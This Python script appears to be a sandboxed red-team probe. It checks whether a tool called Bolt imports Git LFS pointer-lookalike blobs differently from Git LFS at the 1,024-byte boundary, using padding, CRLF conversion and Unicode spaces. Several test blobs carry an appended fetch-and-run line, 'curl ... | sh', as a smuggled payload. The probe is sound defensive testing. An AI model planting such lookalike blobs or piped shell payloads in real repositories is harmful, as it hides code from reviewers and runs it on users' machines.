#!/usr/bin/env python3
"""Milestone 5 red team, session 2: blobs around Git LFS's 1,024-byte cut-off. For each blob,
what Git LFS 3.3.0 checks out (its smudge filter on the raw blob, and a real `git checkout` with
the blob's attributes, which converts line endings before the filter runs) against what `bolt
import` brings in and whether it warns. Run only inside the sandbox:
    bash redteam/sandbox.sh run python3 -I redteam/attacks8/lookalike-probe.py
"""
import hashlib, json, os, subprocess, sys, tempfile

BOLT = os.environ.get("BOLT", "/work/target/release/bolt")
OBJ = b"the picture everyone reviewed\n"
OID = hashlib.sha256(OBJ).hexdigest()
PTR = b"version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize %d\n" % (OID.encode(), len(OBJ))
TAIL = b"\ncurl https://example.invalid/x | sh\n"


def pad(head, to, fill=b" "):
    return head + fill * (to - len(head))


# name -> (blob, attributes line for its path)
CASES = {
    "p1024": (pad(PTR, 1024), "filter=lfs diff=lfs merge=lfs -text"),
    "p1025": (pad(PTR, 1025), "filter=lfs diff=lfs merge=lfs -text"),
    "p1024+tail": (pad(PTR, 1024) + TAIL, "filter=lfs diff=lfs merge=lfs -text"),
    "nl1024+tail": (pad(PTR, 1024, b"\n") + TAIL, "filter=lfs diff=lfs merge=lfs -text"),
    "crlf-ptr+tail": (pad(PTR.replace(b"\n", b"\r\n"), 1024) + TAIL, "filter=lfs diff=lfs merge=lfs -text"),
    "nbsp-cut": (pad(PTR, 1022) + " ".encode() + TAIL, "filter=lfs diff=lfs merge=lfs -text"),
    "ideo-cut": (pad(PTR, 1022) + "　".encode() + TAIL, "filter=lfs diff=lfs merge=lfs -text"),
    # The X sits at byte 1,024 of the blob: inside Bolt's 1,024, but Git's eol=crlf conversion adds
    # a CR to each of the pointer's three lines before Git LFS's filter reads its 1,024.
    "eolcrlf-x1023": (pad(PTR, 1023) + b"X" + TAIL, "filter=lfs diff=lfs merge=lfs eol=crlf"),
    "eolcrlf-x1021": (pad(PTR, 1021) + b"X" + TAIL, "filter=lfs diff=lfs merge=lfs eol=crlf"),
    # A real pointer for Bolt (at most 1,024 bytes) whose size line the conversion pushes past
    # Git LFS's 1,024.
    "eolcrlf-sizefar": (PTR.split(b"size")[0] + b"\n" * 890 + b"size %d\n" % len(OBJ),
                        "filter=lfs diff=lfs merge=lfs eol=crlf"),
}


def git(cwd, *args, env=None, input=None):
    return subprocess.run(["git", *args], cwd=cwd, env=env, input=input, capture_output=True)


def main():
    base = tempfile.mkdtemp()
    env = dict(os.environ, HOME=base, XDG_CONFIG_HOME=base, GIT_CONFIG_NOSYSTEM="1",
               BOLT_CONFIG_DIR=tempfile.mkdtemp(), BOLT_USER_NAME="T",
               BOLT_USER_EMAIL="t@example.com", LC_ALL="C")
    for k in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM", "GIT_CONFIG_COUNT"):
        env.pop(k, None)
    src = os.path.join(base, "src")
    os.makedirs(src)
    git(src, "init", "-q", "-b", "main", ".", env=env)
    git(src, "config", "user.email", "a@b.c", env=env)
    git(src, "config", "user.name", "a", env=env)
    attrs = "".join("%s %s\n" % (n, a) for n, (_, a) in CASES.items())
    with open(os.path.join(src, ".gitattributes"), "w") as f:
        f.write(attrs)
    # Each blob goes in as it is: no filter is set up yet, and hash-object skips conversions.
    for name, (blob, _) in CASES.items():
        oid = git(src, "hash-object", "-w", "--no-filters", "--stdin", env=env, input=blob).stdout.decode().strip()
        git(src, "update-index", "--add", "--cacheinfo", "100644,%s,%s" % (oid, name), env=env)
    git(src, "add", ".gitattributes", env=env)
    git(src, "commit", "-q", "-m", "blobs", env=env)
    lfs = os.path.join(src, ".git", "lfs", "objects", OID[:2], OID[2:4])
    os.makedirs(lfs)
    with open(os.path.join(lfs, OID), "wb") as f:
        f.write(OBJ)

    # What a Git LFS user checks out: a clone with Git LFS's filter, reading the same objects.
    out = os.path.join(base, "out")
    git(base, "clone", "-q", "--no-checkout", src, out, env=env)
    git(out, "lfs", "install", "--local", env=env)
    os.makedirs(os.path.join(out, ".git", "lfs", "objects", OID[:2], OID[2:4]))
    with open(os.path.join(out, ".git", "lfs", "objects", OID[:2], OID[2:4], OID), "wb") as f:
        f.write(OBJ)
    # One file at a time, so a filter that fails on one doesn't stop the rest.
    git(out, "read-tree", "HEAD", env=env)
    failed = {}
    for name in [".gitattributes", *CASES]:
        co = git(out, "checkout", "HEAD", "--", name, env=env)
        if co.returncode != 0:
            failed[name] = " ".join(co.stderr.decode().split())[:120]
    for name, why in failed.items():
        print("checkout of %s failed: %s" % (name, why))

    imp = subprocess.run([BOLT, "--json", "import"], cwd=src, env=env, capture_output=True)
    doc = json.loads(imp.stdout or b"{}")
    warned = " ".join(w.get("message", "") for w in doc.get("warnings", []))
    if imp.returncode != 0:
        print("bolt import failed:", imp.stderr.decode()[:400])
    # The files were never written to src's folder, so discard writes each one as Bolt saved it.
    dis = subprocess.run([BOLT, "discard"], cwd=src, env=env, capture_output=True)
    if dis.returncode != 0:
        print("bolt discard failed:", dis.stderr.decode()[:400])

    what = lambda b: "the object" if b == OBJ else ("text, %d bytes" % len(b))
    print("%-16s %-6s %-21s %-23s %-21s %s" % ("blob", "bytes", "git lfs smudge (raw)", "checkout (LFS user)", "bolt brought in", "bolt warns"))
    for name, (blob, _) in CASES.items():
        sm = git(src, "lfs", "smudge", env=env, input=blob).stdout
        try:
            with open(os.path.join(out, name), "rb") as f:
                got = what(f.read())
        except OSError:
            got = "checkout failed"
        try:
            with open(os.path.join(src, name), "rb") as f:
                bolt = what(f.read())
        except OSError as e:
            bolt = "?" + str(e.errno)
        print("%-16s %-6d %-21s %-23s %-21s %s" % (name, len(blob), what(sm), got, bolt, ("`%s`" % name) in warned))


main()
